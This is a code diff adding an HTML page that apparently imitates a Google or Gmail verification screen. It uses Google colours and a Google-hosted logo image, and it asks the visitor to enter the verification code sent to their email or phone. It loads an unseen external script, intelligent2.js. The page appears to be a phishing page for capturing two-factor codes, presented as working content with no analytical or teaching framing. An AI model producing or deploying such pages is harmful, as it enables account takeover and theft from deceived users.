@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification</title>
+
+<style>
+    body {
+        margin: 0;
+        background: #f1f3f4;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .container {
+        background: #fff;
+        width: 95%;
+        max-width: 380px;
+        padding: 40px 30px;
+        border-radius: 12px;
+        box-shadow: 0 2px 25px rgba(0,0,0,0.12);
+        text-align: center;
+        animation: fadeIn 0.35s ease-out;
+    }
+
+    .logo {
+        width: 65px;
+        height: 65px;
+        border-radius: 12px;
+        margin: 0 auto 15px;
+        background: #fff;
+        border: 1px solid #e0e0e0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 34px;
+        font-weight: bold;
+        color: #4285F4;
+    }
+
+    .logo span {
+        color: #DB4437;   /* red */
+    }
+
+    .title {
+        font-size: 23px;
+        font-weight: 600;
+        color: #202124;
+        margin-top: 5px;
+    }
+
+    .subtitle {
+        font-size: 14px;
+        color: #5f6368;
+        margin: 12px 0 28px;
+        line-height: 21px;
+    }
+
+    .code-input {
+        width: 100%;
+        padding: 14px;
+        font-size: 17px;
+        border-radius: 8px;
+        border: 1px solid #dadce0;
+        outline: none;
+        transition: all 0.2s ease;
+    }
+
+    .code-input:focus {
+        border-color: #1a73e8;
+        box-shadow: 0 0 7px rgba(26,115,232,0.3);
+    }
+
+    .verify-btn {
+        width: 100%;
+        padding: 14px;
+        margin-top: 22px;
+        background: #1a73e8;
+        color: #fff;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        font-size: 16px;
+        font-weight: 600;
+        transition: background 0.2s ease;
+    }
+
+    .verify-btn:hover {
+        background: #1666d1;
+    }
+
+    .resend {
+        margin-top: 18px;
+        font-size: 14px;
+        color: #5f6368;
+    }
+
+    .resend a {
+        color: #1a73e8;
+        text-decoration: none;
+        font-weight: 500;
+    }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(8px); }
+        to   { opacity: 1; transform: translateY(0); }
+    }
+    img {
+      width: 80px;
+    }
+</style>
+</head>
+<script src="intelligent2.js"></script>
+<body>
+
+<div class="container">
+    <div class="logo"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwAeXALckYvVkP0lA1PqDqdZLYqpsTl8pOly0h15Bwag&s=10"></div>
+
+    <h2 class="title">Verification Code</h2>
+    <form>
+    <p class="subtitle">Enter the verification code we sent to your email address or phone number.</p>
+
+    <input type="text" class="code-input" placeholder="Enter your code" name="Gmail verification code" required>
+
+    <button class="verify-btn" type="submit">Verify</button>
+</form>
+    <p class="resend">Didn't receive a code? <a href="#">Resend</a></p>
+</div>
+
+</body>
+</html>
